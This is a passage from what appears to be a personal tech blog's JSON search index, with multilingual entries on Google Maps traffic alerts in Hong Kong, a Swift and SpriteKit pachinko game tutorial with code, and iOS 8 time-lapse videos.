setting. We’ve placed the code for follow-up into a separate followUp function. No global variable is needed. In the real world, this could become part of a callback chain, and we’ll discuss that later.","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"jasmine","slug":"jasmine","permalink":"https://neo01.com/tags/jasmine/"},{"name":"javascript","slug":"javascript","permalink":"https://neo01.com/tags/javascript/"}]},{"title":"Google 地图在香港路线规划期间显示交通警报","slug":"2014/08/google-map-show-traffic-alerts-during-route-planning-in-hong-kong-zh-CN","date":"un11fin11","updated":"un00fin00","comments":true,"path":"/zh-CN/2014/08/google-map-show-traffic-alerts-during-route-planning-in-hong-kong/","permalink":"https://neo01.com/zh-CN/2014/08/google-map-show-traffic-alerts-during-route-planning-in-hong-kong/","excerpt":"Google 地图在香港实时显示交通警报！发现这个惊喜功能如何帮助我避开交通事故。","text":"今天早上通勤上班时，我考虑开车是否是一个可行的选择。我的新工作地点在东涌，我通常搭乘巴士和港铁通勤。 我使用 iPhone 访问 Google 地图，点击目的地，并检查哪条路线更好。令我惊讶的是，其中一条路线显示了交通警报！ 我原以为这个功能是 Apple 地图独有的，并且只在某些主要城市（如纽约市）可用。我从未想过它会在香港可用。 我切换检查从东涌到香港岛的路线。看起来交通警报仅针对东行交通。 接下来，我通过切换回从香港岛到东涌的原始路线来检查西行交通。果然，它显示正常交通状况。 在网上搜索后，我找不到任何关于交通警报的相关信息。直到 10 分钟后，当我回到办公室时，我才找到相关报道。 我确信这些交通事件报告是实时更新的。万岁！ 根据香港政府网站（http://www.gov.hk/en/theme/psi/datasets/specialtrafficnews.htm），这些交通事件报告的来源可能来自政府本身。","categories":[{"name":"Misc","slug":"Misc","permalink":"https://neo01.com/categories/Misc/"}],"tags":[{"name":"Google","slug":"Google","permalink":"https://neo01.com/tags/Google/"}],"lang":"zh-CN"},{"title":"Google Maps Shows Traffic Alerts During Route Planning in Hong Kong","slug":"2014/08/google-map-show-traffic-alerts-during-route-planning-in-hong-kong","date":"un11fin11","updated":"un66fin66","comments":true,"path":"2014/08/google-map-show-traffic-alerts-during-route-planning-in-hong-kong/","permalink":"https://neo01.com/2014/08/google-map-show-traffic-alerts-during-route-planning-in-hong-kong/","excerpt":"Discovered Google Maps now shows real-time traffic alerts in Hong Kong! See how this surprising feature helped me avoid a traffic incident.","text":"While commuting to work this morning, I considered whether driving might be a viable option. My new workplace is in Tung Chung, and I typically commute by bus and MTR. I used my iPhone to access Google Maps, tapped on the destination, and checked which route was better. To my surprise, one of the routes displayed a traffic alert! I had assumed this feature was exclusive to Apple Maps and available only in certain major cities like New York City. I never expected it to be available in Hong Kong. I switched to check the route from Tung Chung to Hong Kong Island. It appeared that the traffic alert was specific to eastbound traffic only. Next, I checked westbound traffic by switching back to the original route from Hong Kong Island to Tung Chung. Sure enough, it showed normal traffic conditions. After searching online, I couldn’t find any relevant information about the traffic alert. It wasn’t until 10 minutes later, when I returned to the office, that I found a related report. I am confident that these traffic incident reports are updated in real time. Hooray! According to the Hong Kong government’s website (http://www.gov.hk/en/theme/psi/datasets/specialtrafficnews.htm), the source of these traffic incident reports may come from the government itself.","categories":[{"name":"Misc","slug":"Misc","permalink":"https://neo01.com/categories/Misc/"}],"tags":[{"name":"Google","slug":"Google","permalink":"https://neo01.com/tags/Google/"}]},{"title":"Google 地圖在香港路線規劃期間顯示交通警報","slug":"2014/08/google-map-show-traffic-alerts-during-route-planning-in-hong-kong-zh-TW","date":"un11fin11","updated":"un00fin00","comments":true,"path":"/zh-TW/2014/08/google-map-show-traffic-alerts-during-route-planning-in-hong-kong/","permalink":"https://neo01.com/zh-TW/2014/08/google-map-show-traffic-alerts-during-route-planning-in-hong-kong/","excerpt":"Google 地圖在香港即時顯示交通警報！發現這個驚喜功能如何幫助我避開交通事故。","text":"今天早上通勤上班時，我考慮開車是否是一個可行的選擇。我的新工作地點在東涌，我通常搭乘巴士和港鐵通勤。 我使用 iPhone 存取 Google 地圖，點擊目的地，並檢查哪條路線更好。令我驚訝的是，其中一條路線顯示了交通警報！ 我原以為這個功能是 Apple 地圖獨有的，並且只在某些主要城市（如紐約市）可用。我從未想過它會在香港可用。 我切換檢查從東涌到香港島的路線。看起來交通警報僅針對東行交通。 接下來，我透過切換回從香港島到東涌的原始路線來檢查西行交通。果然，它顯示正常交通狀況。 在網上搜尋後，我找不到任何關於交通警報的相關資訊。直到 10 分鐘後，當我回到辦公室時，我才找到相關報導。 我確信這些交通事件報告是即時更新的。萬歲！ 根據香港政府網站（http://www.gov.hk/en/theme/psi/datasets/specialtrafficnews.htm），這些交通事件報告的來源可能來自政府本身。","categories":[{"name":"Misc","slug":"Misc","permalink":"https://neo01.com/categories/Misc/"}],"tags":[{"name":"Google","slug":"Google","permalink":"https://neo01.com/tags/Google/"}],"lang":"zh-TW"},{"title":"Discover Swift: Writing a Pachinko game on iOS with Swift and SpriteKit","slug":"2014/08/discover-swift-writing-a-pachinko-game-on-ios-with-swift-and-spritekit","date":"un33fin33","updated":"un66fin66","comments":true,"path":"2014/08/discover-swift-writing-a-pachinko-game-on-ios-with-swift-and-spritekit/","permalink":"https://neo01.com/2014/08/discover-swift-writing-a-pachinko-game-on-ios-with-swift-and-spritekit/","excerpt":"Build a Japanese pinball game with Swift and SpriteKit! Learn type inference, optional variables, and physics collision handling from scratch. Full source code on GitHub.","text":"📖 neoalienson/pachinko An iOS 'pinball' game using SpriteKit and Swift with physics engine ⭐ 7 Stars 🍴 1 Forks Language: C++ Do you like Swift, the programming language that comes with XCode 6 from Apple? You may not know, but I developed a fondness for it after writing a game with it. I am going to show you how to write a game with Swift. If you’d like to jump right into the source code of this game, you can download or clone it from GitHub Getting started with XCode 6 Firstly, you need to download XCode 6. At the moment, XCode 6 is not officially released, so you’ll need to join ‘iOS Developer Program’ to access it. Once you’ve installed Xcode and chosen to create a new project, you can select the iOS Application with Game template, Fill in product name, choosing the language Swift and the framework SpriteKit, Type Inference Once the canned game is created, you can set scaleMode in GameViewController.swift to .AspectFit, e.g., scene.scaleMode = .AspectFit. The canned version sets scaleMode to .AspectFill. I got lost with the coordinates when using .AspectFill and found that part of the game scene wasn’t being shown under this mode. I discovered that setting scaleMode to .AspectFit would be easier to learn the coordinate system because all of the scene is shown. Empty spaces are added with .AspectFit if they don’t match, so you won’t miss any part of your scene. You don’t need to specify the type for .AspectFit, as Swift can infer the type from scene.scaleMode using Type Inference. Additionally, the semicolon is not required to end a statement. Are you starting to love it? Handling different scene aspect ratio Next, resize the GameScene.sks to 640 width and 1136 height such that it fits aspect ratio to iPhone 5. Note that the numbers aren’t in pixel units because the scene can be scaled according to scaleMode, using 640 is easier for reference purposes in the game program. It may be difficult to see the selected game scene on your first launch, as it will fits the editor by default; zooming out with the ‘-’ icon can help. You’ll know you’ve selected the scene from breadcrumb or property window on right. Build basic game elements with SpriteKit SpriteKit is very familiar to me as I have experience with Cocos2d and Cocos2d-x. It is an all-in-one physics engine, 2d graphics engine, and animation engine. Let’s start by creating pins, fences and borders. import SpriteKit class GameScene: SKScene &#123; var borderBottom: SKShapeNode? &#x3D; nil override func didMoveToView(view: SKView) &#123; let top &#x3D; scene.size.height; let right &#x3D; scene.size.width; &#x2F;&#x2F; pins let pinRadius : CGFloat &#x3D; 5 let pinSpacing : CGFloat &#x3D; 100 for var x : CGFloat &#x3D; 75; x &lt; 500; x +&#x3D; pinSpacing &#123; for var y : CGFloat &#x3D; 200; y &lt; 800; y +&#x3D; pinSpacing &#123; let sprite &#x3D; SKShapeNode(circleOfRadius: pinRadius) sprite.physicsBody &#x3D; SKPhysicsBody(circleOfRadius: pinRadius) sprite.physicsBody.dynamic &#x3D; false &#x2F;&#x2F; straggered pins sprite.position.x &#x3D; x + (y % (pinSpacing * 2)) &#x2F; 2 sprite.position.y &#x3D; y sprite.fillColor &#x3D; UIColor.whiteColor() self.addChild(sprite) &#125; &#125; &#x2F;&#x2F; fences let fenceSpacing : CGFloat &#x3D; 100 let fenceSize &#x3D; CGSize(width: 5, height: 75) for var x : CGFloat &#x3D; fenceSpacing; x &lt; right - 100; x +&#x3D; fenceSpacing &#123; let sprite &#x3D; SKShapeNode(rectOfSize: fenceSize) sprite.physicsBody &#x3D; SKPhysicsBody(rectangleOfSize: fenceSize) sprite.physicsBody.dynamic &#x3D; false sprite.position &#x3D; CGPoint(x: x, y: fenceSize.height &#x2F; 2) sprite.fillColor &#x3D; UIColor.whiteColor() self.addChild(sprite) &#125; &#x2F;&#x2F; bottom let pathBottom &#x3D; CGPathCreateMutable() CGPathMoveToPoint(pathBottom, nil, 0, 0) CGPathAddLineToPoint(pathBottom, nil, right, 0) borderBottom &#x3D; SKShapeNode(path: pathBottom) borderBottom?.physicsBody &#x3D; SKPhysicsBody(edgeChainFromPath: pathBottom) borderBottom?.physicsBody.dynamic &#x3D; false self.addChild(borderBottom) &#x2F;&#x2F; other borders let path &#x3D; CGPathCreateMutable() CGPathMoveToPoint(path, nil, 0, 0) CGPathAddLineToPoint(path, nil, 0, top) CGPathAddLineToPoint(path, nil, right - 150, top) CGPathAddLineToPoint(path, nil, right - 50, top - 50) CGPathAddLineToPoint(path, nil, right, top - 150) CGPathAddLineToPoint(path, nil, right, 0) let borders &#x3D; SKShapeNode(path: path) borders.physicsBody &#x3D; SKPhysicsBody(edgeChainFromPath: path) borders.physicsBody.dynamic &#x3D; false self.addChild(borders) &#125; &#125; Non-optional/Optional Variable? You may wonder what SKShapeNode? is in var borderBottom: SKShapeNode? = nil. In Swift, variables are non-optional by default and cannot be set to nil (or null) without explicit declaration. To make a variable optional, you need to append a question mark (?) to the end of its type. This design makes Swift more fool-proof because many developers in other languages accidentally dereference variables, leading to null pointer exceptions or method calls on undefined objects. Having an optional annotation can be helpful, but it would clutter your code with unnecessary annotations. Well, we still don’t have a game to play yet! Now let’s try to add some action and make things more fun. override func touchesBegan(touches: NSSet, withEvent event: UIEvent) &#123; &#x2F;&#x2F; launch a ball let sprite &#x3D; SKSpriteNode(imageNamed:&quot;Spaceship&quot;) sprite.xScale &#x3D; 0.15 sprite.yScale &#x3D; 0.15 sprite.position &#x3D; CGPoint(x: 605, y: 40) sprite.physicsBody &#x3D; SKPhysicsBody(circleOfRadius: 30) sprite.physicsBody.contactTestBitMask &#x3D; 1 self.addChild(sprite) &#x2F;&#x2F; give some randomness sprite.physicsBody.velocity.dy &#x3D; 3000 + CGFloat(rand()) * 300 &#x2F; CGFloat(RAND_MAX); &#125; The spaceships fill up the screen if you tap continuously. Let’s do something when the spaceship hits the floor, Handle object collision First, make the GameScence conform to SKPhysicsContactDelegate, which means that it can now have a function to handle contacts between physics objects. class GameScene: SKScene, SKPhysicsContactDelegate &#123; var score &#x3D; 0 And below is the function to handle object contact, func didBeginContact(contact: SKPhysicsContact!) &#123; if contact.bodyA &#x3D;&#x3D; borderBottom?.physicsBody &#123; let body &#x3D; contact.bodyB &#x2F;&#x2F; disable futher collision body.contactTestBitMask &#x3D; 0 let node &#x3D; body.node &#x2F;&#x2F; fade out node.runAction(SKAction.sequence([ SKAction.fadeAlphaTo(0, duration: 1), SKAction.removeFromParent()])) &#x2F;&#x2F; update score score +&#x3D; 10 let label &#x3D; self.childNodeWithName(&quot;score&quot;) as SKLabelNode label.text &#x3D; String(score) &#x2F;&#x2F; score float up from the ball let scoreUp &#x3D; SKLabelNode(text: &quot;+10&quot;) scoreUp.position &#x3D; node.position self.addChild(scoreUp) scoreUp.runAction(SKAction.sequence([ SKAction.moveBy(CGVector(dx: 0, dy: 50), duration: 1), SKAction.removeFromParent() ])) &#125; &#125; You should set contact delegate to the GameScene since it conforms to the protocol, override func didMoveToView(view: SKView) &#123; &#x2F;&#x2F; setup collision delegate self.physicsWorld.contactDelegate &#x3D; self &#125; Cool! I hope you’re not addicted to the game. Download/browse source in GitHub. I wish that one day, Swift and SpriteKit would become cross-platform.","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"iOS","slug":"iOS","permalink":"https://neo01.com/tags/iOS/"},{"name":"Swift","slug":"Swift","permalink":"https://neo01.com/tags/Swift/"}]},{"title":"探索 Swift：使用 Swift 和 SpriteKit 在 iOS 上编写弹珠游戏","slug":"2014/08/discover-swift-writing-a-pachinko-game-on-ios-with-swift-and-spritekit-zh-CN","date":"un33fin33","updated":"un00fin00","comments":true,"path":"/zh-CN/2014/08/discover-swift-writing-a-pachinko-game-on-ios-with-swift-and-spritekit/","permalink":"https://neo01.com/zh-CN/2014/08/discover-swift-writing-a-pachinko-game-on-ios-with-swift-and-spritekit/","excerpt":"用 Swift 和 SpriteKit 打造日本弹珠台游戏!从零开始学习类型推断、可选变量和物理碰撞处理。","text":"📖 neoalienson/pachinko An iOS 'pinball' game using SpriteKit and Swift with physics engine ⭐ 7 Stars 🍴 1 Forks Language: C++ 你喜欢 Swift 吗？这是 Apple 在 XCode 6 中提供的编程语言。你可能不知道，但我在用它编写游戏后就喜欢上了它。我将向你展示如何使用 Swift 编写游戏。如果你想直接查看这个游戏的源代码，可以从 GitHub 下载或克隆它。 开始使用 XCode 6 首先，你需要下载 XCode 6。目前，XCode 6 尚未正式发布，所以你需要加入&quot;iOS Developer Program&quot;才能访问它。安装 Xcode 并选择创建新项目后，你可以选择带有 Game 模板的 iOS Application， 填写产品名称，选择语言 Swift 和框架 SpriteKit， 类型推断 创建示例游戏后，你可以在 GameViewController.swift 中将 scaleMode 设置为 .AspectFit，例如，scene.scaleMode = .AspectFit。示例版本将 scaleMode 设置为 .AspectFill。使用 .AspectFill 时我对坐标感到困惑，发现在此模式下部分游戏场景没有显示。我发现将 scaleMode 设置为 .AspectFit 会更容易学习坐标系统，因为所有场景都会显示。如果不匹配，.AspectFit 会添加空白空间，所以你不会错过场景的任何部分。你不需要为 .AspectFit 指定类型，因为 Swift 可以使用类型推断从 scene.scaleMode 推断类型。此外，不需要分号来结束语句。你开始喜欢它了吗？ 处理不同的场景宽高比 接下来，将 GameScene.sks 调整为 640 宽度和 1136 高度，使其适合 iPhone 5 的宽高比。请注意，这些数字不是像素单位，因为场景可以根据 scaleMode 缩放，使用 640 在游戏程序中更容易参考。首次启动时可能很难看到选定的游戏场景，因为它默认适合编辑器；使用&quot;-&quot;图标缩小可以帮助。你可以从面包屑或右侧的属性窗口知道你已选择了场景。 使用 SpriteKit 构建基本游戏元素 SpriteKit 对我来说非常熟悉，因为我有 Cocos2d 和 Cocos2d-x 的经验。它是一个集物理引擎、2D 图形引擎和动画引擎于一体的工具。让我们从创建钉子、栅栏和边界开始。 import SpriteKit class GameScene: SKScene &#123; var borderBottom: SKShapeNode? &#x3D; nil override func didMoveToView(view: SKView) &#123; let top &#x3D; scene.size.height; let right &#x3D; scene.size.width; &#x2F;&#x2F; pins let pinRadius : CGFloat &#x3D; 5 let pinSpacing : CGFloat &#x3D; 100 for var x : CGFloat &#x3D; 75; x &lt; 500; x +&#x3D; pinSpacing &#123; for var y : CGFloat &#x3D; 200; y &lt; 800; y +&#x3D; pinSpacing &#123; let sprite &#x3D; SKShapeNode(circleOfRadius: pinRadius) sprite.physicsBody &#x3D; SKPhysicsBody(circleOfRadius: pinRadius) sprite.physicsBody.dynamic &#x3D; false &#x2F;&#x2F; straggered pins sprite.position.x &#x3D; x + (y % (pinSpacing * 2)) &#x2F; 2 sprite.position.y &#x3D; y sprite.fillColor &#x3D; UIColor.whiteColor() self.addChild(sprite) &#125; &#125; &#x2F;&#x2F; fences let fenceSpacing : CGFloat &#x3D; 100 let fenceSize &#x3D; CGSize(width: 5, height: 75) for var x : CGFloat &#x3D; fenceSpacing; x &lt; right - 100; x +&#x3D; fenceSpacing &#123; let sprite &#x3D; SKShapeNode(rectOfSize: fenceSize) sprite.physicsBody &#x3D; SKPhysicsBody(rectangleOfSize: fenceSize) sprite.physicsBody.dynamic &#x3D; false sprite.position &#x3D; CGPoint(x: x, y: fenceSize.height &#x2F; 2) sprite.fillColor &#x3D; UIColor.whiteColor() self.addChild(sprite) &#125; &#x2F;&#x2F; bottom let pathBottom &#x3D; CGPathCreateMutable() CGPathMoveToPoint(pathBottom, nil, 0, 0) CGPathAddLineToPoint(pathBottom, nil, right, 0) borderBottom &#x3D; SKShapeNode(path: pathBottom) borderBottom?.physicsBody &#x3D; SKPhysicsBody(edgeChainFromPath: pathBottom) borderBottom?.physicsBody.dynamic &#x3D; false self.addChild(borderBottom) &#x2F;&#x2F; other borders let path &#x3D; CGPathCreateMutable() CGPathMoveToPoint(path, nil, 0, 0) CGPathAddLineToPoint(path, nil, 0, top) CGPathAddLineToPoint(path, nil, right - 150, top) CGPathAddLineToPoint(path, nil, right - 50, top - 50) CGPathAddLineToPoint(path, nil, right, top - 150) CGPathAddLineToPoint(path, nil, right, 0) let borders &#x3D; SKShapeNode(path: path) borders.physicsBody &#x3D; SKPhysicsBody(edgeChainFromPath: path) borders.physicsBody.dynamic &#x3D; false self.addChild(borders) &#125; &#125; 非可选/可选变量？ 你可能想知道 var borderBottom: SKShapeNode? = nil 中的 SKShapeNode? 是什么。在 Swift 中，变量默认是非可选的，不能在没有显式声明的情况下设置为 nil（或 null）。要使变量可选，你需要在其类型末尾附加问号（?）。这种设计使 Swift 更加防错，因为许多其他语言的开发人员会意外地解引用变量，导致空指针异常或对未定义对象的方法调用。拥有可选注释可能会有所帮助，但它会使你的代码充满不必要的注释。好吧，我们还没有可以玩的游戏！现在让我们尝试添加一些动作，让事情变得更有趣。 override func touchesBegan(touches: NSSet, withEvent event: UIEvent) &#123; &#x2F;&#x2F; launch a ball let sprite &#x3D; SKSpriteNode(imageNamed:&quot;Spaceship&quot;) sprite.xScale &#x3D; 0.15 sprite.yScale &#x3D; 0.15 sprite.position &#x3D; CGPoint(x: 605, y: 40) sprite.physicsBody &#x3D; SKPhysicsBody(circleOfRadius: 30) sprite.physicsBody.contactTestBitMask &#x3D; 1 self.addChild(sprite) &#x2F;&#x2F; give some randomness sprite.physicsBody.velocity.dy &#x3D; 3000 + CGFloat(rand()) * 300 &#x2F; CGFloat(RAND_MAX); &#125; 如果你连续点击，飞船会填满屏幕。让我们在飞船撞到地板时做点什么， 处理对象碰撞 首先，使 GameScence 符合 SKPhysicsContactDelegate，这意味着它现在可以有一个函数来处理物理对象之间的接触。 class GameScene: SKScene, SKPhysicsContactDelegate &#123; var score &#x3D; 0 以下是处理对象接触的函数， func didBeginContact(contact: SKPhysicsContact!) &#123; if contact.bodyA &#x3D;&#x3D; borderBottom?.physicsBody &#123; let body &#x3D; contact.bodyB &#x2F;&#x2F; disable futher collision body.contactTestBitMask &#x3D; 0 let node &#x3D; body.node &#x2F;&#x2F; fade out node.runAction(SKAction.sequence([ SKAction.fadeAlphaTo(0, duration: 1), SKAction.removeFromParent()])) &#x2F;&#x2F; update score score +&#x3D; 10 let label &#x3D; self.childNodeWithName(&quot;score&quot;) as SKLabelNode label.text &#x3D; String(score) &#x2F;&#x2F; score float up from the ball let scoreUp &#x3D; SKLabelNode(text: &quot;+10&quot;) scoreUp.position &#x3D; node.position self.addChild(scoreUp) scoreUp.runAction(SKAction.sequence([ SKAction.moveBy(CGVector(dx: 0, dy: 50), duration: 1), SKAction.removeFromParent() ])) &#125; &#125; 你应该将接触委托设置为 GameScene，因为它符合协议， override func didMoveToView(view: SKView) &#123; &#x2F;&#x2F; setup collision delegate self.physicsWorld.contactDelegate &#x3D; self &#125; 太棒了！我希望你不会沉迷于这个游戏。在 GitHub 下载/浏览源代码。我希望有一天，Swift 和 SpriteKit 能够跨平台。","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"iOS","slug":"iOS","permalink":"https://neo01.com/tags/iOS/"},{"name":"Swift","slug":"Swift","permalink":"https://neo01.com/tags/Swift/"}],"lang":"zh-CN"},{"title":"探索 Swift：使用 Swift 和 SpriteKit 在 iOS 上編寫彈珠台遊戲","slug":"2014/08/discover-swift-writing-a-pachinko-game-on-ios-with-swift-and-spritekit-zh-TW","date":"un33fin33","updated":"un66fin66","comments":true,"path":"/zh-TW/2014/08/discover-swift-writing-a-pachinko-game-on-ios-with-swift-and-spritekit/","permalink":"https://neo01.com/zh-TW/2014/08/discover-swift-writing-a-pachinko-game-on-ios-with-swift-and-spritekit/","excerpt":"用 Swift 和 SpriteKit 打造日本彈珠台遊戲!從零開始學習型別推斷、可選變數和物理碰撞處理。","text":"📖 neoalienson/pachinko An iOS 'pinball' game using SpriteKit and Swift with physics engine ⭐ 7 Stars 🍴 1 Forks Language: C++ 你喜歡 Swift 嗎？這是 Apple 在 XCode 6 中推出的程式語言。你可能不知道，但我在用它編寫遊戲後對它產生了好感。我將向你展示如何使用 Swift 編寫遊戲。如果你想直接查看這個遊戲的原始碼，你可以從 GitHub 下載或複製它。 開始使用 XCode 6 首先，你需要下載 XCode 6。目前，XCode 6 尚未正式發布，所以你需要加入「iOS Developer Program」才能存取它。安裝 Xcode 並選擇建立新專案後，你可以選擇帶有遊戲範本的 iOS 應用程式， 填寫產品名稱，選擇語言 Swift 和框架 SpriteKit， 型別推斷 建立範本遊戲後，你可以在 GameViewController.swift 中將 scaleMode 設定為 .AspectFit，例如 scene.scaleMode = .AspectFit。範本版本將 scaleMode 設定為 .AspectFill。使用 .AspectFill 時我對座標感到困惑，發現在此模式下部分遊戲場景沒有顯示。我發現將 scaleMode 設定為 .AspectFit 會更容易學習座標系統，因為所有場景都會顯示。如果不匹配，.AspectFit 會添加空白空間，所以你不會錯過場景的任何部分。你不需要為 .AspectFit 指定型別，因為 Swift 可以使用型別推斷從 scene.scaleMode 推斷型別。此外，不需要分號來結束語句。你開始喜歡它了嗎？ 處理不同的場景長寬比 接下來，將 GameScene.sks 調整為 640 寬度和 1136 高度，使其符合 iPhone 5 的長寬比。請注意，這些數字不是以像素為單位，因為場景可以根據 scaleMode 進行縮放，使用 640 在遊戲程式中更容易參考。第一次啟動時可能很難看到選定的遊戲場景，因為它預設會適應編輯器；使用「-」圖示縮小可以提供幫助。你可以從麵包屑或右側的屬性視窗知道你已選擇了場景。 使用 SpriteKit 建構基本遊戲元素 SpriteKit 對我來說非常熟悉，因為我有 Cocos2d 和 Cocos2d-x 的經驗。它是一個集物理引擎、2D 圖形引擎和動畫引擎於一體的工具。讓我們從建立釘子、柵欄和邊界開始。 import SpriteKit class GameScene: SKScene &#123; var borderBottom: SKShapeNode? &#x3D; nil override func didMoveToView(view: SKView) &#123; let top &#x3D; scene.size.height; let right &#x3D; scene.size.width; &#x2F;&#x2F; pins let pinRadius : CGFloat &#x3D; 5 let pinSpacing : CGFloat &#x3D; 100 for var x : CGFloat &#x3D; 75; x &lt; 500; x +&#x3D; pinSpacing &#123; for var y : CGFloat &#x3D; 200; y &lt; 800; y +&#x3D; pinSpacing &#123; let sprite &#x3D; SKShapeNode(circleOfRadius: pinRadius) sprite.physicsBody &#x3D; SKPhysicsBody(circleOfRadius: pinRadius) sprite.physicsBody.dynamic &#x3D; false &#x2F;&#x2F; straggered pins sprite.position.x &#x3D; x + (y % (pinSpacing * 2)) &#x2F; 2 sprite.position.y &#x3D; y sprite.fillColor &#x3D; UIColor.whiteColor() self.addChild(sprite) &#125; &#125; &#x2F;&#x2F; fences let fenceSpacing : CGFloat &#x3D; 100 let fenceSize &#x3D; CGSize(width: 5, height: 75) for var x : CGFloat &#x3D; fenceSpacing; x &lt; right - 100; x +&#x3D; fenceSpacing &#123; let sprite &#x3D; SKShapeNode(rectOfSize: fenceSize) sprite.physicsBody &#x3D; SKPhysicsBody(rectangleOfSize: fenceSize) sprite.physicsBody.dynamic &#x3D; false sprite.position &#x3D; CGPoint(x: x, y: fenceSize.height &#x2F; 2) sprite.fillColor &#x3D; UIColor.whiteColor() self.addChild(sprite) &#125; &#x2F;&#x2F; bottom let pathBottom &#x3D; CGPathCreateMutable() CGPathMoveToPoint(pathBottom, nil, 0, 0) CGPathAddLineToPoint(pathBottom, nil, right, 0) borderBottom &#x3D; SKShapeNode(path: pathBottom) borderBottom?.physicsBody &#x3D; SKPhysicsBody(edgeChainFromPath: pathBottom) borderBottom?.physicsBody.dynamic &#x3D; false self.addChild(borderBottom) &#x2F;&#x2F; other borders let path &#x3D; CGPathCreateMutable() CGPathMoveToPoint(path, nil, 0, 0) CGPathAddLineToPoint(path, nil, 0, top) CGPathAddLineToPoint(path, nil, right - 150, top) CGPathAddLineToPoint(path, nil, right - 50, top - 50) CGPathAddLineToPoint(path, nil, right, top - 150) CGPathAddLineToPoint(path, nil, right, 0) let borders &#x3D; SKShapeNode(path: path) borders.physicsBody &#x3D; SKPhysicsBody(edgeChainFromPath: path) borders.physicsBody.dynamic &#x3D; false self.addChild(borders) &#125; &#125; 非可選/可選變數？ 你可能想知道 var borderBottom: SKShapeNode? = nil 中的 SKShapeNode? 是什麼。在 Swift 中，變數預設是非可選的，不能在沒有明確宣告的情況下設定為 nil（或 null）。要使變數成為可選的，你需要在其型別的末尾附加問號（?）。這種設計使 Swift 更加防呆，因為許多其他語言的開發者會意外地解引用變數，導致空指標異常或對未定義物件的方法呼叫。擁有可選註解可能很有幫助，但它會使你的程式碼充滿不必要的註解。好吧，我們還沒有可以玩的遊戲！現在讓我們嘗試添加一些動作，讓事情變得更有趣。 override func touchesBegan(touches: NSSet, withEvent event: UIEvent) &#123; &#x2F;&#x2F; launch a ball let sprite &#x3D; SKSpriteNode(imageNamed:&quot;Spaceship&quot;) sprite.xScale &#x3D; 0.15 sprite.yScale &#x3D; 0.15 sprite.position &#x3D; CGPoint(x: 605, y: 40) sprite.physicsBody &#x3D; SKPhysicsBody(circleOfRadius: 30) sprite.physicsBody.contactTestBitMask &#x3D; 1 self.addChild(sprite) &#x2F;&#x2F; give some randomness sprite.physicsBody.velocity.dy &#x3D; 3000 + CGFloat(rand()) * 300 &#x2F; CGFloat(RAND_MAX); &#125; 如果你持續點擊，太空船會填滿螢幕。讓我們在太空船撞到地板時做些什麼， 處理物體碰撞 首先，讓 GameScence 符合 SKPhysicsContactDelegate，這意味著它現在可以有一個函數來處理物理物體之間的接觸。 class GameScene: SKScene, SKPhysicsContactDelegate &#123; var score &#x3D; 0 以下是處理物體接觸的函數， func didBeginContact(contact: SKPhysicsContact!) &#123; if contact.bodyA &#x3D;&#x3D; borderBottom?.physicsBody &#123; let body &#x3D; contact.bodyB &#x2F;&#x2F; disable futher collision body.contactTestBitMask &#x3D; 0 let node &#x3D; body.node &#x2F;&#x2F; fade out node.runAction(SKAction.sequence([ SKAction.fadeAlphaTo(0, duration: 1), SKAction.removeFromParent()])) &#x2F;&#x2F; update score score +&#x3D; 10 let label &#x3D; self.childNodeWithName(&quot;score&quot;) as SKLabelNode label.text &#x3D; String(score) &#x2F;&#x2F; score float up from the ball let scoreUp &#x3D; SKLabelNode(text: &quot;+10&quot;) scoreUp.position &#x3D; node.position self.addChild(scoreUp) scoreUp.runAction(SKAction.sequence([ SKAction.moveBy(CGVector(dx: 0, dy: 50), duration: 1), SKAction.removeFromParent() ])) &#125; &#125; 你應該將接觸委託設定為 GameScene，因為它符合協定， override func didMoveToView(view: SKView) &#123; &#x2F;&#x2F; setup collision delegate self.physicsWorld.contactDelegate &#x3D; self &#125; 太酷了！我希望你不會沉迷於這個遊戲。在 GitHub 下載/瀏覽原始碼。我希望有一天，Swift 和 SpriteKit 能夠成為跨平台的。","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"iOS","slug":"iOS","permalink":"https://neo01.com/tags/iOS/"},{"name":"Swift","slug":"Swift","permalink":"https://neo01.com/tags/Swift/"}],"lang":"zh-TW"},{"title":"iOS 8 縮時攝影影片","slug":"2014/07/ios-8-time-lapsed-videos-zh-TW","date":"un11fin11","updated":"un66fin66","comments":true,"path":"/zh-TW/2014/07/ios-8-time-lapsed-videos/","permalink":"https://neo01.com/zh-TW/2014/07/ios-8-time-lapsed-videos/","excerpt":"iOS 8 預設相機現已支援縮時攝影！查看我在 iPhone 4s 上拍攝的香港黎明和駕駛影片。","text":"我在 iPhone 4s 上安裝了 iOS 8 beta 3。預設相機現在支援拍攝縮時攝影影片。使用相機拍攝縮時攝影影片非常簡單，因為你沒有任何選項…根據我的經驗，至少根據我的觀察，它每秒拍攝一幀。 以下是我從床邊櫃拍攝的香港大圍黎明， 另一個是我在開車時拍攝的， 通常在繁忙交通和白天拍攝縮時攝影影片會更好。在夜間高速公路上開車的縮時攝影影片可能會導致令人眩暈且能見度低的影片，如下所示（效果不太好）：","categories":[{"name":"Misc","slug":"Misc","permalink":"https://neo01.com/categories/Misc/"}],"tags":[{"name":"iOS","slug":"iOS","permalink":"https://neo01.com/tags/iOS/"}],"lang":"zh-TW"},{"title":"iOS 8 延时摄影视频","slug":"2014/07/ios-8-time-lapsed-videos-zh-CN","date":"un11fin11","updated":"un66fin66","comments":true,"path":"/zh-CN/2014/07/ios-8-time-lapsed-videos/","permalink":"https://neo01.com/zh-CN/2014/07/ios-8-time-lapsed-videos/","excerpt":"iOS 8 默认相机现已支持延时摄影！查看我在 iPhone 4s 上拍摄的香港黎明和驾驶视频。","text":"我在 iPhone 4s 上安装了 iOS 8 beta 3。默认相机现在支持拍摄延时摄影视频。使用相机拍摄延时摄影视频非常简单，因为你没有任何选项…根据我的经验，至少根据我的观察，它每秒拍摄一帧。 以下是我从床边柜拍摄的香港大围黎明， 另一个是我在开车时拍摄的， 通常在繁忙交通和白天拍摄延时摄影视频会更好。在夜间高速公路上开车的延时摄影视频可能会导致令人眩晕且能见度低的视频，如下所示（效果不太好）：","categories":[{"name":"Misc","slug":"Misc","permalink":"https://neo01.com/categories/Misc/"}],"tags":[{"name":"iOS","slug":"iOS","permalink":"https://neo01.com/tags/iOS/"}],"lang":"zh-CN"},{"title":"iOS 8 